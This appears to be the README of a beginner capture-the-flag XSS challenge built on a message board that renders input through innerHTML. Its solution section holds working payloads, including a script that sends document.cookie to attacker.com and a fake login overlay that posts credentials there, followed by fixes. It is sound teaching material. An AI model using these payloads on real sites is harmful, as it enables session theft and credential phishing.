# Simple XSS Challenge

## Challenge Overview

**Difficulty:** Beginner  
**Category:** Web Security  
**Points:** 100  

## Description

This is a simple message board application that contains a Cross-Site Scripting (XSS) vulnerability. Your task is to identify and exploit this vulnerability to execute JavaScript code in the browser.

## Learning Objectives

- Understand how XSS vulnerabilities occur
- Learn to identify vulnerable input fields
- Practice crafting XSS payloads
- Understand the impact of XSS vulnerabilities

## Setup Instructions

1. Navigate to the `simple_xss_challenge` directory
2. Open the `index.html` file in a web browser
3. The challenge runs entirely in the browser - no server required

## Challenge Tasks

1. **Basic Exploitation:** Make the page show a JavaScript alert box with the text "XSS"
2. **Cookie Stealing:** Create a payload that would allow an attacker to steal cookies (don't actually steal cookies)
3. **DOM Manipulation:** Change the title of the page using XSS
4. **Advanced:** Create a payload that adds a fake login form to the page

## Hints

1. Look at how user input is handled in the application
2. Check the JavaScript code for unsafe practices
3. Remember that HTML tags can be used to execute JavaScript
4. The vulnerability is in how the application displays messages

## Solution

<details>
<summary>Click to reveal the solution</summary>

### Basic Payload
```html
<script>alert('XSS')</script>
```

### Cookie Stealing Payload
```html
<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
```

### DOM Manipulation Payload
```html
<script>document.title = 'Hacked!';</script>
```

### Fake Login Form Payload
```html
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background-color:rgba(0,0,0,0.9);z-index:10000;display:flex;justify-content:center;align-items:center">
  <div style="background-color:white;padding:20px;border-radius:5px;width:300px">
    <h2>Session Expired</h2>
    <p>Please log in again to continue</p>
    <form action="https://attacker.com/steal">
      <div style="margin-bottom:10px">
        <label>Username:</label>
        <input type="text" name="username" style="width:100%;padding:5px">
      </div>
      <div style="margin-bottom:10px">
        <label>Password:</label>
        <input type="password" name="password" style="width:100%;padding:5px">
      </div>
      <button type="submit" style="background-color:#4CAF50;color:white;border:none;padding:10px;width:100%">Login</button>
    </form>
  </div>
</div>
```

### Explanation

The vulnerability exists because the application directly inserts user input into the page's HTML using `innerHTML` without any sanitization:

```javascript
messageElement.innerHTML = `
    <div class="message-header">${name} says:</div>
    <div class="message-content">${message}</div>
`;
```

To fix this vulnerability, the application should either:

1. Use `textContent` instead of `innerHTML`
2. Sanitize user input by escaping HTML special characters
3. Use a library like DOMPurify to sanitize HTML

Fixed code example:

```javascript
// Option 1: Use textContent
const headerDiv = document.createElement('div');
headerDiv.className = 'message-header';
headerDiv.textContent = `${name} says:`;

const contentDiv = document.createElement('div');
contentDiv.className = 'message-content';
contentDiv.textContent = message;

messageElement.appendChild(headerDiv);
messageElement.appendChild(contentDiv);

// Option 2: Escape HTML
function escapeHTML(str) {
    return str.replace(/[&<>"']/g, function(match) {
        return {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#39;'
        }[match];
    });
}

messageElement.innerHTML = `
    <div class="message-header">${escapeHTML(name)} says:</div>
    <div class="message-content">${escapeHTML(message)}</div>
`;
```
</details>

## Prevention

To prevent XSS vulnerabilities in real applications:

1. Always validate and sanitize user input
2. Use proper output encoding when displaying user input
3. Implement Content Security Policy (CSP)
4. Use modern frameworks that automatically escape output
5. Use the `textContent` property instead of `innerHTML` when possible

## Additional Resources

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS Learning Materials](https://portswigger.net/web-security/cross-site-scripting)
- [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)